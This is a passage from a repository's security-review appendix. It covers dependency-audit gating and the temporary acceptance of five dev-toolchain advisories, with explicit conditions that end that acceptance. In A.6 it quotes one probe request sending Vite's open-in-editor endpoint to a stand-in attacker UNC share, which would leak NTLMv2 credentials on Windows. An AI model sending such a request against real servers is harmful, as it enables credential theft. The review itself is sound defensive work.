· `format:check` · `validate:scope` · `validate:provenance` · `pnpm verify` · and an explicit
resolution assertion, `pnpm why vite` and `pnpm why esbuild`, because the manifest edit alone does
not guarantee the resolved versions.

## A.5 Automated dependency scanning — SR-11

A **blocking** audit step in the existing `verify` job, plus a license scan. Not advisory: `ci.yml`
already documents this failure mode for the secret scan — a scan that reports success having read
nothing is worse than no scan. Network or registry failure must fail loudly rather than be swallowed.

Evidence for it already exists on both sides: today's `main` is the vulnerable tree (exit 1, five
advisories) and the tested worktree is the remediated one (exit 0).

**Ordering: SR-10 before SR-11**, or CI goes red the moment the scan lands. If the owner prefers
SR-11 first, it must ship with an allowlist naming all five GHSAs, each with an owner and a **hard
expiration date** (Article X). An allowlist without expiries reproduces the failure mode it exists to
prevent.

## A.6 Temporary acceptance, and what ends it

Until SR-10 is approved and merged, all five remain open and are **temporarily accepted**.

**Justification.** None of the five is reachable by any command this repository runs. Every one
requires a listening Vite or Vitest HTTP server, and no script in `package.json`, no step in
`ci.yml`, nothing in `scripts/`, no `vite.config.*`/`vitest.config.*`, no `.vscode`/`.idea`/
`.devcontainer`, no Makefile and no git hook starts one. Nothing ships. Two of the five are
additionally Windows-only and CI is `ubuntu-latest`. The remediation is a dev-toolchain major-version
move the owner has not yet approved and which must not be forced.

**The weakest acceptance, flagged rather than buried:** GHSA-v6wh-96g9-6wx3. Its route is live and
unauthenticated the instant anyone runs `pnpm exec vite` — a standard command using a binary already
present in `node_modules/.bin`. A verifier started it and confirmed
`GET /__open-in-editor?file=\\attacker\share\x` returns **HTTP 200** with no auth, no CSRF token and
no origin check. Only the Windows gate and the absence of any first-party command stand between this
repository and a working NTLMv2 leak.

**Conditions that end the acceptance — it does not expire quietly:**

1. **SR-10 merges.** The intended end.
2. Any script, workflow, runbook, devcontainer, IDE task, or git hook starts a listening Vite or
   Vitest server (`vite`, `vitest --ui`, `vitest --api`, or `test.api` in config). Ends it for all five.
3. Any developer runs the toolchain on **Windows**. Ends it for GHSA-v6wh-96g9-6wx3 and
   GHSA-fx2h-pf6j-xcff immediately.
4. The repository gains a devcontainer, Codespaces, or container dev flow where a server could bind a
   non-loopback interface. Ends it for GHSA-5xrq-8626-4rwp.
5. `vite`, `vitest`, or `esbuild` becomes a build or runtime dependency of anything that ships — any
   workspace package gaining a `build` script, a bundler, or a published or containerised artifact.
6. A new advisory lands against this subtree that is exploitable **without** a listening server.
7. SR-11 lands before SR-10, in which case each advisory carries a named owner and a hard expiration
   date, and the acceptance ends on that date regardless.

## A.7 Additional risk opened by this appendix

| ID       | Risk                                                                                                                                                                                                                                                                                                                                                                                                                                               | Tier | Status   | Closure                                                                                                                                                                                                  |
| -------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---- | -------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| PR0-R-18 | **`vitest.workspace.ts:25` asserts a serialisation guarantee it does not provide.** `fileParallelism: false` is a silent no-op in the per-project position under vitest 2.1.9, and a type error under vitest 3. Test isolation is actually provided by `harness.ts`, which gives each file its own database — so this is a comprehension and maintenance hazard, not an active correctness bug, and the option's comment states a stale rationale. | R1   | **Open** | Its own change — either a root-level setting the pool actually reads, or removal of the key together with a comment recording that `harness.ts` provides the isolation. **Not** to be folded into SR-10. |
